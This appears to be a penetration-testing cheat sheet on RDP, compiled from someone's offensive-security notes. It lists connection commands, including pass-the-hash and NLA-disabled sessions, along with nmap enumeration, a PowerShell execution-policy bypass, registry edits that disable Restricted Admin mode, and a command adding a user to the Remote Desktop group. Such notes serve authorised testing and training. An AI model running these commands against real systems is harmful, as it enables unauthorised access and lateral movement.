> Source: `01101100-C0D3X-00110110.md` → `CLEAR CMD RUNMRU? > Commands > Basics > RDP`

```bash
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /d:<DOMAIN> /cert-ignore
xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
xfreerdp /v:<RHOST> /dynamic-resolution +clipboard /tls-seclevel:0 -sec-nla
rdesktop <RHOST>
```

> Source: `01101100-C0D3X-00110110.md` → `Enumeration > Service Enumeration > RDP`

```bash
nmap --script=rdp-enum-encryption -p 3389 <target>
xfreerdp /v:<target> /u:<user> /p:<password>
xfreerdp /v:10.X.X.X /d:Domain /u:user /p:'Password123' /drive:linux,/root/offesec
```

> **Note:** You might need to exclude `/d:Domain` in some cases.

```bash
rdesktop 10.X.X.X -d Domain -u user -p 'Password123' -r disk:linux='/home/user/rdesktop/files'
```


## RDP Automation

> Source: `01101100-C0D3X-00110110.md` → `PrivEsc > Windows > RDP Automation`

- **PowerShell Script (example):**

```PowerShell
powershell -ep bypass
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
.\RDP-Automation.ps1 # Script content would involve enabling RDP, adding user, firewall rule
net user pwned
```


## impacket reg add example (Allow rdp connection without password)

> Source: `01101100-C0D3X-00110110.md` → `Impacket > impacket reg add example (Allow rdp connection without password)`

```
impacket-reg <domain>/<username>@<ip> -hashes ':<nthath>' add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v 'DisableRestrictedAdmin' -vt 'REG_DWORD' -vd '0'
```


## Windows Disable RDP restricted admin

> Source: `01101100-C0D3X-00110110.md` → `Windows > Windows Disable RDP restricted admin`

https://www.rebeladmin.com/2016/02/restricted-admin-mode-for-remote-desktop-connections/
```
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force
```


## Add user to RDP Group

> Source: `01101100-C0D3X-00110110.md` → `Windows > Add user to RDP Group`

```
NET LOCALGROUP "Remote Desktop Users" <domain>\<username> /ADD
```

